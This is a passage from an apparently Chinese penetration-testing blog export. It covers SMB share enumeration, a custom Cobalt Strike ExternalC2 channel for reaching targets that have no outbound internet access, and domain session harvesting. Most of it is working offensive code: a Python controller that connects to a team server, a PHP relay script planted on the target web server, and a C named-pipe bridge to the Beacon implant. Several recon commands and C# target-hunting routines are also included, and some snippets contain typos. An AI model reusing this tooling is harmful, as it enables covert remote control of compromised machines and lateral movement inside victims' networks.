关键源码如下： 12345678910111213141516171819202122232425262728293031323334/// &lt;summary&gt;/// 返回指定计算机所开放的共享，并返回 SHARE_INFO_1[] 数组结构/// https://www.pinvoke.net/default.aspx/netapi32/netshareenum.html/// &lt;/summary&gt;/// &lt;param name="Server"&gt;&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;public static SHARE_INFO_1[] EnumNetShares(string Server)&#123; List&lt;SHARE_INFO_1&gt; ShareInfos = new List&lt;SHARE_INFO_1&gt;(); int entriesread = 0; int totalentries = 0; int resume_handle = 0; int nStructSize = Marshal.SizeOf(typeof(SHARE_INFO_1)); IntPtr bufPtr = IntPtr.Zero; StringBuilder server = new StringBuilder(Server); int ret = NetShareEnum(server, 1, ref bufPtr, MAX_PREFERRED_LENGTH, ref entriesread, ref totalentries, ref resume_handle); if (ret == NERR_Success) &#123; IntPtr currentPtr = bufPtr; for (int i = 0; i &lt; entriesread; i++) &#123; SHARE_INFO_1 shi1 = (SHARE_INFO_1)Marshal.PtrToStructure(currentPtr, typeof(SHARE_INFO_1)); ShareInfos.Add(shi1); currentPtr += nStructSize; &#125; NetApiBufferFree(bufPtr); return ShareInfos.ToArray(); &#125; else &#123; ShareInfos.Add(new SHARE_INFO_1("ERROR=" + ret.ToString(), 10, string.Empty)); return ShareInfos.ToArray(); &#125;&#125; 演示结果： 0X02 进一步拓展2.1、判断是否可读判断可读，是根据当前用户权限进行判断的。 12string path = String.Format("\\\\&#123;0&#125;\\&#123;1&#125;", computer, share.shi1_netname);var files = System.IO.Directory.GetFiles(path); 直接根据以上方法进行访问测试即可。效果如下 接下来就是以当前权限，对可访问的共享进行遍历即可。获取文件名、文件大小，再进行下一步的筛选。 2.2、遍历1234567891011121314151617181920212223242526/// &lt;summary&gt;/// 对路径进行遍历/// &lt;/summary&gt;/// &lt;param name="info"&gt;提供的根路径&lt;/param&gt;public static void ListFiles(FileSystemInfo info)&#123; if (!info.Exists) return; DirectoryInfo dir = info as DirectoryInfo; //不是目录 if (dir == null) return; try &#123; FileSystemInfo[] files = dir.GetFileSystemInfos(); for (int i = 0; i &lt; files.Length; i++) &#123; FileInfo file = files[i] as FileInfo; //是文件 if (file != null) Console.WriteLine(file.FullName); //对于子目录，进行递归调用 else ListFiles(files[i]); &#125; &#125; catch &#123; &#125;&#125; 0x03 现有工具 net 命令 12net view \\ip # 查询指定 IP 共享net sharp # 查看 SMB 指向的路径[即共享] Nmap 1smb-enum-shares.nse # 遍历远程主机的共享目录 nbtscan 1nbtscan 192.10.20.0/24 powerview 1234Invoke-StealthUserHunter # 查找域中 domain admins 共享源机器(session from)Invoke-Netview # 检索主机建立的共享会话Invoke-NetviewThreaded # 检索主机建立的共享会话Invoke-ShareFinder # 查找主机建立的共享会话]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>域渗透</tag>
        <tag>C#</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【渗透技巧】Cobalt Strike 的 ExternalC2]]></title>
    <url>%2F2019%2F10%2F%E3%80%90%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E3%80%91Cobalt%20Strike%20%E7%9A%84%20ExternalC2%2F</url>
    <content type="text"><![CDATA[0x00 前言Cobalt Strike 的上线问题归结为以下几点： 问题 解决方法 目标存在杀软（被杀） Shellcode 加载器 目标存在杀软（拦截连接） C2 处理 目标机是 Web 映射出网 特殊 C2 处理 隔离网络 出网机器做跳板 本文针对第 3 点进行展开。 0x01 前置知识点1.1、管道如果对管道不熟悉的朋友，可以将管道理解为采用消息队列方式操作的文件。为什么说管道是文件呢？因为它的本质是一段系统内核的缓冲区，可以看做是一个伪文件。在我们使用管道时，需要 Create、Open、Read、Write、Close，就和我们操作文件差不多。而又为什么说管道是采用消息队列的方式呢？因为它实际上的数据结构是一个环形队列。不同的线程都可以向里面写，也可以从里面读。写在队列末尾，读就是从队列头部删除。 管道分为两种，匿名管道（pipe）和命名管道（FIFO）。匿名管道用于父子进程通信，而命名管道可以用于任意两个进程通信。 服务端：创建管道 &gt;&gt; 监听 &gt;&gt; 读写 &gt;&gt; 关闭 客户端：打开命令管道，获得句柄 &gt;&gt; 写入数据 &gt;&gt; 等待回复 1.2、SMB Beacon官网的解释为：SMB Beacon 使用命名管道通过父 Beacon 进行通信，这种点对点通信借助 Beacons 在同一台主机上实现，它同样也适用于外部的互联网。Windows 当中借助在 SMB 协议中封装命名管道进行通信，因此，命名为 SMB Beacon。 SMB Beacon 默认使用的是：msagent_bb34 以上的说法，其实就是将 Payload 运行（注入）后，创建了自定义命名管道（作服务端），等待连接即可。 0x02 ExternalC2ExternalC2 是 Cobalt Strike 引入的一种规范（或者框架），黑客可以利用这个功能拓展C2通信渠道，而不局限于默认提供的 HTTP(S)/DNS/SMB 通道。大家可以参考此处下载完整的规范说明。 简而言之， 用户可以使用这个框架来开发各种组件，包括如下组件： 第三方控制端（Controller）：负责连接 Cobalt Strike TeamServer，并且能够使用自定义的 C2 通道与目标主机上的第三方客户端（Client）通信。 第三方客户端（Client）：使用自定义C2通道与第三 Controller 通信，将命令转发至 SMB Beacon。 SMB Beacon：在受害者主机上执行的标准 beacon。 从 Cobalt Strike 提供的官方文档中(文末有官方文档)，我们可以看到如下示意图： 从上图可知，我们的自定义 C2 通道两端分别为第三方 Controller 以及第三方 Client，这两个角色都是我们可以研发以及控制的角色。往下走就是一个 完整的 ExternalC2工作流程 0x03 正常的 ExternalC2 工作流程一个粗糙的时序图（图中的空虚线是为了排版，无其他意义）： 3.1、ExternalC2我们需要让 Cobalt Strike 启动 ExternalC2。我们可以使用 externalc2_start 函数，传入端口参数即可。一旦 ExternalC2 服务顺利启动并正常运行，我们需要使用自定义的协议进行通信。 启用 externalc2_start 函数，通知 Teamserver 已开启 C2 1externalc2_start("0.0.0.0", 2222); 等待 Controller 连接传输配置信息 生成下发 Payload Stage 接收和下发信息 3.2、Controller 使用 socket 连接 ExternalC2 平台 12_socketToExternalC2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)_socketToExternalC3.connect(("193.10.20.123", 2222)) 规范接收与发送的数据格式 1234567891011121314151617181920212223def encodeFormat(data): return struct.pack("&lt;I", len(data)) + data def decodeFormat(data): len = struct.unpack("&lt;I", data[0:3]) body = data[4:] return (len, body) def recvFromExternalC2(): data = "" _len = _socketToExternalC3.recv(4) l = struct.unpack("&lt;I",_len)[0] while len(data) &lt; l: data += _socketToExternalC3.recv(l - len(data)) return data def recvFromBeacon(): data = "" _len = _socketToBeacon.recv(4) l = struct.unpack("&lt;I",_len)[0] while len(data) &lt; l: data += _socketToBeacon.recv(l - len(data)) return data 发送配置选项（x86 or x64 、命名管道名称、间隔时间） 发送 go，通知 ExternalC2 可下发 Payload Stage 1234567def sendToTS(data): _socketToExternalC3.sendall(encodeFormat(data)) sendToTS("arch=x86")sendToTS(“pipename=rcoil")sendToTS("block=500")sendToTS("go") 接收来自 ExternalC2 所下发的 Payload Stage 1data = recvFromExternalC2() 与此同时，新开启一个 Socket，进行监听，等待接收来自 Client (EXE) 的数据 1234_socketBeacon = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)_socketBeacon.bind(("0.0.0.0", 8088))_socketBeacon.listen(1)_socketClient = _socketBeacon.accept()[0] 在收到 Client (EXE) 的连接后，向 Client (EXE) 发送 Payload Stage 向ExternalC2 反馈来自 Client (EXE) 的数据 机器上线 进入数据收发循环处理流程 可以参考此处获取完整的 Controller 代码。 3.3、Client (EXE) 同样规范接收与发送的数据格式 连接 Controller，并接收 Payload Stage 将接收到的 Payload Stage 使用常规的进程注入方法注入到进程中 SMB Beacon启动并处于运行状态 Client (EXE) 连接 SMB Beacon 的命名管道，用于接收或下发命令 进入数据收发循环处理流程 可以参考此处获取完整的 Client (EXE) 代码 0x04 特殊的 C2 配置以上所配置的 C2，并不能满足我们现在的特殊需求：Web 映射出网环境上线问题 。由于目标机是不出外网的，所以无法实现上面的： Client 主动连接 Controller，进而将 Payload Stage下发，所以可以从上面的流程进行修改，其实修改起来也不难，以下是解决方案： 1需要在目标机器上面（根据 Web 容器）编写一个对指定的命名管道进行读取和写入的脚本(Client-Web)，然后在 Controller 上对此脚本(Client-Web)进行连接（读写操作），将主动变成被动即可解决。 为了省略阅读时长，直接看以下时序图（图中的空虚线是为了排版，无其他意义）。 需要多一个中转设置，我们将这个中转命名为 Client-Web，确保自定义周期能够完成。接下来小节中的代码，如果是应用于实战，建议自写。 4.1、Controller这一部分与上所述基本一致，只是将挂起的 socket 转为对 Web 的请求，主动去获取数据，再将获取到的数据进行反馈。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117// 代码来源：https://github.com/hl0rey/Web_ExternalC2_Demo/blob/master/controller/webc3.pyimport socketimport structimport requests# import randomimport timePAYLOAD_MAX_SIZE = 512 * 1024BUFFER_MAX_SIZE = 1024 * 1024def tcpconnect(ip, port): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip, port)) return sdef recvdata_unpack(s): chunk = s.recv(4) slen = struct.unpack("&lt;I", chunk)[0] recvdata = s.recv(slen) print("recvdata_unpack: " + str(slen)) # print(recvdata) return recvdatadef senddata_pack(s, data): slen = struct.pack("&lt;I", len(data)) s.sendall(slen+data) print("senddata_pack: " + str(len(data))) # print(data) returndef droppaylod(data): # filename = random.choice(["a", "b", "c", "d"]) + str(random.randint(1000, 9999)) + ".bin" filename = "payload.bin" with open("payload/" + filename, "wb") as fp: fp.write(data) return filenamedef requestpayload(s, arch, pipename, block): senddata_pack(s, ("arch=" + arch).encode("utf-8")) senddata_pack(s, ("pipename=" + pipename).encode("utf-8")) senddata_pack(s, ("block=" + str(block)).encode("utf-8")) senddata_pack(s, "go".encode("utf-8")) #为什么必须这么写，原因需要深究 try: chunk = s.recv(4) except: return "" if len(chunk) &lt; 4: return () slen = struct.unpack('&lt;I', chunk)[0] chunk = s.recv(slen) while len(chunk) &lt; slen: chunk = chunk + s.recv(slen - len(chunk)) return chunkdef read_http(req, url): # res = req.get(url + "?action=read",proxies=&#123;"http": "http://127.0.0.1:8080"&#125;) res = req.get(url + "?action=read") print("read from http: " + str(len(res.content))) # print(res.content) return res.contentdef write_http(req, url, data): print("write to http: " + str(len(data))) length = struct.pack("&lt;I", len(data)) data = length + data # print(data) # req.post(url + "?action=write", data=data, proxies=&#123;"http": "http://127.0.0.1:8080"&#125;) req.post(url + "?action=write", data=data) return# 轮询函数def ctrl_loop(s, req, url): while True: data = read_http(req, url) senddata_pack(s, data) recvdata = recvdata_unpack(s) write_http(req, url, recvdata) #必要的延迟，否则会出错 time.sleep(3)def main(): # externalc2服务的IP和端口 ip = "193.168.113.137" port = 2222 soc = tcpconnect(ip, port) # 请求payload payloaddata = requestpayload(soc, "x64", "rcoil", 1000) paylaodfile = droppaylod(payloaddata) print("paylaod文件名为： " + paylaodfile) print("请使用loader在被控端执行payload") r = requests.session() while True: url = input("请输入第三方客户端地址：") res = r.get(url) if not res.text == 'OK': print("第三方客户端有问题，请查看。") else: break ctrl_loop(soc, r, url)if __name__ == '__main__': main() 4.2、Client–Web等待 Controller 连接，往下就是对脚本的轮询 12345678910111213141516171819202122232425262728293031// 代码来源：https://github.com/hl0rey/Web_ExternalC2_Demo/blob/master/client/php/piperw.phpfunction readpipe($name)&#123; $name="\\\\.\\pipe\\".$name; $fp=fopen($name,"rb"); //分两次读 $len=fread($fp,4); $len=unpack("v",$len)[1]; $data=fread($fp,$len); fclose($fp); echo $data; return $data;&#125;function writepipe($name)&#123; $name="\\\\.\\pipe\\".$name; $fp=fopen($name,"wb"); $data=file_get_contents("php://input"); //一次性写 fwrite($fp,$data); fclose($fp);&#125;if(isset($_GET['action']))&#123; //根据请求参数进行不同的操作 if ($_GET['action']=='read')&#123; readpipe("readrcoil"); &#125;elseif ($_GET['action']=='write')&#123; writepipe("writercoil"); &#125;&#125;else&#123; //脚本执行成功 echo "OK";&#125; 4.3、Client-EXE这个客户端也相当与一个中转 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194// 代码来源：https://github.com/hl0rey/Web_ExternalC2_Demo/blob/master/client/c/webc2_loader/PipeOperationRelay/%E6%BA%90.c#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#define PAYLOAD_MAX_SIZE 512 * 1024#define BUFFER_MAX_SIZE 1024 * 1024//桥，字面意思。方便把自定义的管道和beacon管道桥接的结构体struct BRIDGE&#123; HANDLE client; HANDLE server;&#125;;//从beacon读取数据DWORD read_frame(HANDLE my_handle, char* buffer, DWORD max) &#123; DWORD size = 0, temp = 0, total = 0; /* read the 4-byte length */ ReadFile(my_handle, (char*)&amp; size, 4, &amp;temp, NULL); printf("read_frame length: %d\n", size); /* read the whole thing in */ while (total &lt; size) &#123; ReadFile(my_handle, buffer + total, size - total, &amp;temp, NULL); total += temp; &#125; return size;&#125;//向beacon写入数据void write_frame(HANDLE my_handle, char* buffer, DWORD length) &#123; printf("write_frame length: %d\n", length); DWORD wrote = 0; WriteFile(my_handle, (void*)&amp; length, 4, &amp;wrote, NULL); printf("write %d bytes.\n", wrote); WriteFile(my_handle, buffer, length, &amp;wrote, NULL); printf("write %d bytes.\n", wrote);&#125;//从控制器读取数据DWORD read_client(HANDLE my_handle, char* buffer) &#123; DWORD size = 0; DWORD readed = 0; ReadFile(my_handle, &amp;size, 4, NULL, NULL); printf("read_client length: %d\n", size); ReadFile(my_handle, buffer, size, &amp;readed, NULL); printf("final data from client: %d\n", readed); return readed;&#125;//向控制器写入数据void write_client(HANDLE my_handle, char* buffer, DWORD length) &#123; DWORD wrote = 0; WriteFile(my_handle, buffer, length, &amp;wrote, NULL); printf("write client total %d data %d\n", wrote, length);&#125;//客户端读管道、服务端写管道逻辑DWORD WINAPI ReadOnlyPipeProcess(LPVOID lpvParam) &#123; //把两条管道的句柄取出来 struct BRIDGE* bridge = (struct BRIDGE*)lpvParam; HANDLE hpipe = bridge-&gt;client; HANDLE beacon = bridge-&gt;server; DWORD length = 0; char* buffer = VirtualAlloc(0, BUFFER_MAX_SIZE, MEM_COMMIT, PAGE_READWRITE); if (buffer == NULL) &#123; exit(-1); &#125; //再次校验管道 if ((hpipe == INVALID_HANDLE_VALUE) || (beacon == INVALID_HANDLE_VALUE)) &#123; return FALSE; &#125; while (TRUE) &#123; if (ConnectNamedPipe(hpipe, NULL)) &#123; printf("client want read.\n"); length = read_frame(beacon, buffer, BUFFER_MAX_SIZE); printf("read from beacon: %d\n", length); //分两次传送，发一次长度，再发数据。 write_client(hpipe,(char *) &amp;length, 4); FlushFileBuffers(hpipe); write_client(hpipe, buffer, length); FlushFileBuffers(hpipe); DisconnectNamedPipe(hpipe); //清空缓存区 ZeroMemory(buffer, BUFFER_MAX_SIZE); length = 0; &#125; &#125; return 1;&#125;//客户端写管道、服务端读管道逻辑DWORD WINAPI WriteOnlyPipeProcess(LPVOID lpvParam) &#123; //取出两条管道 struct BRIDGE* bridge = (struct BRIDGE*)lpvParam; HANDLE hpipe = bridge-&gt;client; HANDLE beacon = bridge-&gt;server; DWORD length = 0; char* buffer = VirtualAlloc(0, BUFFER_MAX_SIZE, MEM_COMMIT, PAGE_READWRITE); if (buffer == NULL) &#123; exit(-1); &#125; if ((hpipe == INVALID_HANDLE_VALUE) || (beacon == INVALID_HANDLE_VALUE)) &#123; return FALSE; &#125; while (TRUE) &#123; if (ConnectNamedPipe(hpipe, NULL)) &#123; //一次性读，一次性写 printf("client want write.\n"); length = read_client(hpipe, buffer); printf("read from client: %d\n", length); write_frame(beacon, buffer, length); DisconnectNamedPipe(hpipe); //清空缓存区 ZeroMemory(buffer, BUFFER_MAX_SIZE); length = 0; &#125; &#125; return 2;&#125;int main(int argc, char* argv[]) &#123; //创建客户端读管道 HANDLE hPipeRead = CreateNamedPipe("\\\\.\\pipe\\readrcoil", PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, BUFFER_MAX_SIZE, BUFFER_MAX_SIZE, 0, NULL); //创建客户端写管道 HANDLE hPipeWrite = CreateNamedPipe("\\\\.\\pipe\\writercoil", PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, BUFFER_MAX_SIZE, BUFFER_MAX_SIZE, 0, NULL); //与beacon建立连接 HANDLE hfileServer = CreateFileA("\\\\.\\pipe\\rcoil", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL); //检测管道和连接是否建立成功 if ((hPipeRead == INVALID_HANDLE_VALUE) || (hPipeWrite == INVALID_HANDLE_VALUE) || (hfileServer == INVALID_HANDLE_VALUE)) &#123; if (hPipeRead == INVALID_HANDLE_VALUE) &#123; printf("error during create readpipe."); &#125; if (hPipeWrite == INVALID_HANDLE_VALUE) &#123; printf("error during create writepipe."); &#125; if (hfileServer == INVALID_HANDLE_VALUE) &#123; printf("error during connect to beacon."); &#125; exit(-1); &#125; else &#123; //一切正常 printf("all pipes are ok.\n"); &#125; //放入客户端读管道和beacon连接 struct BRIDGE readbridge; readbridge.client = hPipeRead; readbridge.server = hfileServer; //启动客户端读管道逻辑 HANDLE hTPipeRead = CreateThread(NULL, 0, ReadOnlyPipeProcess, (LPVOID)&amp; readbridge, 0, NULL); //放入客户端写管道和beacon连接 struct BRIDGE writebridge; writebridge.client = hPipeWrite; writebridge.server = hfileServer; //启动客户端写管道逻辑 HANDLE hTPipeWrite = CreateThread(NULL, 0, WriteOnlyPipeProcess, (LPVOID)&amp; writebridge, 0, NULL); //代码没有什么意义，直接写个死循环也行 HANDLE waitHandles[] = &#123; hPipeRead,hPipeWrite &#125;; while (TRUE) &#123; WaitForMultipleObjects(2, waitHandles, TRUE, INFINITE); &#125; return 0;&#125; 当然，自用的会使用 C# 进行重写。 0x05 实操5.1、加载脚本加载 ExternalC2.cna，完成第一步。 5.2、Controller这里我们使用的代码是参照 XPN 的代码写成与上方 hl0rey 一样格式的代码。 5.3、Client使用加载器加载这一段 shellcode，查看 pipelist，可以看到我们自定义的管道名。 到这里，可以说明 SMB Beacon 已经成功运行，目前缺少的是可与之进行交互的上层进程。往下继续，运行 Client-EXE（使用hl0rey的代码），再次查看 pipelist，结果如下 5.4、Cobalt Strike成功上线。 5.5、问题但是，查看 PipeOption.exe，崩了。同时，Cobalt Strike 上线的机器，心跳包正常，但是功能无法使用。 应该是 PipeOption.exe 和 php 脚本之间出现的问题，通过抓包，发现这里应该是权限问题。 将 PipeOpiton.exe 以管理员权限运行，action=read 则没出错。 向 Lz1y 大佬请教了下，还是改改 Client-EXE 和 Client-Web 的代码算了。不使用命名管道，直接读写文件，这样 Client-Web 的不同版本也可以很好写。看到这里是不是很蛋疼，嘤嘤嘤。相关代码后续再补上吧，留个坑！！！ 0x06 参考Exploring Cobalt Strike’s ExternalC2 framework利用 External C2 解决内网服务器无法出网的问题一起探索Cobalt Strike的ExternalC2框架externalc2spec.pdf]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【域渗透】域内会话收集]]></title>
    <url>%2F2019%2F10%2F%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E5%9F%9F%E5%86%85%E4%BC%9A%E8%AF%9D%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[2018 年3月，BooldHound 发表了篇博文 SharpHound: Target Selection and API Usage 。这里面介绍了一些关于收集 BooldHound 所需信息的收集方法及所使用的 API。而本文主要介绍两个关于收集会话信息的 API及利用远程注册表的方法（翻译+补充），也是对【域渗透】获取域环境内用户登录信息 的一个补充。 0x00 前言使用过BooldHound 的朋友都知道，它所呈现出来非常多的信息，基本能满足日常信息收集所需的数据，但是之前使用的时候，就很惊讶，它们的会话关系数据来源是怎么来的，所幸后来官方给了解释。 0x01 会话收集BooldHound 公开了三种不同的查询计算机会话信息的方法，都是从检查 445 端口开始的。 1）、NetSessionEnum它不允许直接查询是谁登陆了此工作站，但是它允许查询是谁在访问此工作站的网络资源（例如文件共享）时所创建的网络会话，从而知道来自何处。当然这里最好的查询对象是域控 + 文件共享服务器。此函数不需要高权限。 该函数原型是： 它需要 9 个参数，我们只需了解其中的 5 个参数即可： servername：该字符串指定要在其上执行函数的远程服务器的DNS或NetBIOS名称。如果此参数为NULL，则使用本地计算机。 UncClientName：该字符串指定要为其返回信息的计算机会话的名称。如果此参数为 NULL，则 NetSessionEnum 将返回服务器上所有计算机会话的信息。 username：该字符串指定要为其返回信息的用户的名称。如果此参数为 NULL，则 NetSessionEnum 将返回所有用户的信息。 level：指定数据的信息级别。 bufptr：指向接收数据的缓冲区的指针。此数据的格式取决于 level 参数的值。此缓冲区由系统分配，必须使用 NetApiBufferFree 函数释放 。请注意，即使函数因 ERROR_MORE_DATA 而失败，也必须释放缓冲区。 而此 API 的调用示例为： 12string server = "rcoil.me"nStatus = NetSessionEnum(server, null, null, 10, out Bufptr, -1, ref dwEntriesread, ref dwTotalentries, ref dwResume_handle); 其中，level 的数值为10，是唯一以未经身份验证的方式获取所需数据的级别。 它会返回如下内容： 1234sesi10_cname - 192.10.22.102sesi10_username - RcoIlsesi10_time - 0sesi10_idle_time - 0 关键源码如下： 12345678910111213141516171819202122232425262728293031323334353637/// &lt;summary&gt;/// 返回指定服务器的所有 SESSIONS。返回 SESSION_INFO_10 结构的数组。/// https://www.pinvoke.net/default.aspx/netapi32/NetSessionEnum.html/// &lt;/summary&gt;/// &lt;param name="server"&gt;默认所有域内机器，隐形目标：域控制器+共享服务器&lt;/param&gt;/// &lt;returns&gt;SESSION_INFO_10 STRUCTURE ARRAY&lt;/returns&gt;public static SESSION_INFO_10[] EnumSessions(string server)&#123; IntPtr Bufptr; int nStatus = 0; Int32 dwEntriesread = 0, dwTotalentries = 0, dwResume_handle = 0; Bufptr = (IntPtr)Marshal.SizeOf(typeof(SESSION_INFO_10)); SESSION_INFO_10[] results = new SESSION_INFO_10[0]; do &#123; nStatus = NetSessionEnum(server, null, null, 10, out Bufptr, -1, ref dwEntriesread, ref dwTotalentries, ref dwResume_handle); results = new SESSION_INFO_10[dwEntriesread]; if (nStatus == (int)NERR.ERROR_MORE_DATA || nStatus == (int)NERR.NERR_Success) &#123; Int32 p = Bufptr.ToInt32(); for (int i = 0; i &lt; dwEntriesread; i++) &#123; SESSION_INFO_10 si = (SESSION_INFO_10)Marshal.PtrToStructure(new IntPtr(p), typeof(SESSION_INFO_10)); results[i] = si; p += Marshal.SizeOf(typeof(SESSION_INFO_10)); &#125; //NetApiBufferFree(BufPtr); &#125; // 释放先前从进程的非托管内存分配的内存。 Marshal.FreeHGlobal(Bufptr); &#125; while (nStatus == (int)NERR.ERROR_MORE_DATA); return results;&#125; 2）、NetWkstaUserEnum该 NetWkstaUserEnum 功能可以列出当前登录到该工作站的所有用户的信息。此列表包括交互式、服务和批量登录。此函数需要主机的管理权限或这域管权限，适用于自检使用。 该函数原型是： 它需要 7个参数，我们只需了解其中的 3 个参数即可： servername：该字符串指定要在其上执行函数的远程服务器的DNS或NetBIOS名称。如果此参数为NULL，则使用本地计算机。 level：指定数据的信息级别。 bufptr：指向接收数据的缓冲区的指针。此数据的格式取决于 level 参数的值。此缓冲区由系统分配，必须使用 NetApiBufferFree 函数释放 。请注意，即使函数因 ERROR_MORE_DATA 而失败，也必须释放缓冲区。 而此 API 的调用示例为： 12string server = "rcoil.me"nStatus = NetWkstaUserEnum(server, 1, out Bufptr, 32768, out dwEntriesread, out dwTotalentries, ref dwResumehandle); 其中，level 的数值为1，是因为 1 比 0 返回的数据多，因此选择了 1。 它会返回如下内容： 1234wkui1_username - Administratorwkui1_logon_domain - RDC_1wkui1_oth_domains -wkui1_logon_server - RCOIL 关键源码如下： 1234567891011121314151617181920212223242526272829303132333435363738/// &lt;summary&gt;/// API 调用的第二个参数是 API 调用的级别，其中 1 返回的数据多于 0，所以选择 1进行测试/// https://www.pinvoke.net/default.aspx/netapi32/netwkstauserenum.html/// &lt;/summary&gt;/// &lt;param name="server"&gt;默认所有域内机器，隐形目标：域控制器+共享服务器&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;public static WKSTA_USER_INFO_1[] EnumWkstaUser(string server)&#123; IntPtr Bufptr; int nStatus = 0; Int32 dwEntriesread = 0, dwTotalentries = 0, dwResumehandle = 0; Bufptr = (IntPtr)Marshal.SizeOf(typeof(WKSTA_USER_INFO_1)); WKSTA_USER_INFO_1[] results = new WKSTA_USER_INFO_1[0]; do &#123; nStatus = NetWkstaUserEnum(server, 1, out Bufptr, 32768, out dwEntriesread, out dwTotalentries, ref dwResumehandle); results = new WKSTA_USER_INFO_1[dwEntriesread]; if ((nStatus == NERR_SUCCESS) || (nStatus == ERROR_MORE_DATA)) &#123; if (dwEntriesread &gt; 0) &#123; IntPtr pstruct = Bufptr; for (int i = 0; i &lt; dwEntriesread; i++) &#123; WKSTA_USER_INFO_1 wui1 = (WKSTA_USER_INFO_1)Marshal.PtrToStructure(pstruct, typeof(WKSTA_USER_INFO_1)); results[i] = wui1; pstruct = (IntPtr)((int)pstruct + Marshal.SizeOf(typeof(WKSTA_USER_INFO_1))); &#125; &#125; &#125; if (Bufptr != IntPtr.Zero) NetApiBufferFree(Bufptr); &#125; while (nStatus == ERROR_MORE_DATA); return results;&#125; 3）、远程注册表此方法仅为辅助启用。尝试打开远程注册表的用户配置单元（如果已启用），并将查找与 SID 格式匹配的子项，这些对应于登录用户将获取的 SID 转换成用户名即可。一般来说，需要域管权限去操作，而在极少数情况下，无需管理员权限即可访问此数据，这个得看脸。 此处使用 OpenRemoteBaseKey() 函数。 它需要 2 个参数： RegistryHive：来自 RegistryHive 的枚举。这里选择 Users，表示 HKEY_USERS。 string：表示远程主机。 此函数的调用示例为： 1var key = RegistryKey.OpenRemoteBaseKey(RegistryHive.Users, server); 它会返回如下内容： 1HKEY_USERS 然后读取 HKEY_USERS 的键项就可以了。关键源码如下： 1234567891011121314151617181920212223242526272829303132/// &lt;summary&gt;/// 利用 OpenRemoteBaseKey 读取 HKEY_USERS 的键项/// &lt;/summary&gt;/// &lt;param name="server"&gt;&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;private static IEnumerable&lt;string&gt; GetRegistryLoggedOn(string server)&#123; var users = new List&lt;string&gt;(); try &#123; // 远程打开注册表配置单元，如果它不是我们当前的配置单元 RegistryKey key = RegistryKey.OpenRemoteBaseKey(RegistryHive.Users, server); // 找到与我们的正则表达式匹配的所有子项 var filtered = key.GetSubKeyNames().Where(sub =&gt; SidRegex.IsMatch(sub)); foreach (var subkey in filtered) &#123; users.Add(subkey); &#125; &#125; catch (Exception) &#123; yield break; &#125; foreach (var user in users.Distinct()) &#123; yield return user; &#125;&#125; 最后将 用户的SID 转成用户名即可。 1string Username = new SecurityIdentifier(regSID).Translate(typeof(NTAccount)).ToString(); 4）、结果 0x02 备忘录 API 调用 协议 端口 RPC 接口 UUID 命名管道 RPC 方法 NetSessionEnum.aspx) [MS-SRVS]: Server Service Remote Protocol TCP 445 4B324FC8-1670-01D3-1278-5A47BF6EE188 \PIPE\srvsvc NetrSessionEnum NetWkstaUserEnum.aspx) [MS-WKST]: Workstation Service Remote Protocol TCP 445 6BFFD098-A112-3610-9833-46C3F87E345A \PIPE\wkssvc NetrWkstaUserEnum Github 项目地址：SharpDomainSession ，此项目仅供实验使用 Demo。如想更进一步利用，可移至 SharpHound]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>域渗透</tag>
        <tag>C#</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【知识回顾】进程注入-第一部分]]></title>
    <url>%2F2019%2F09%2F%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%2F</url>
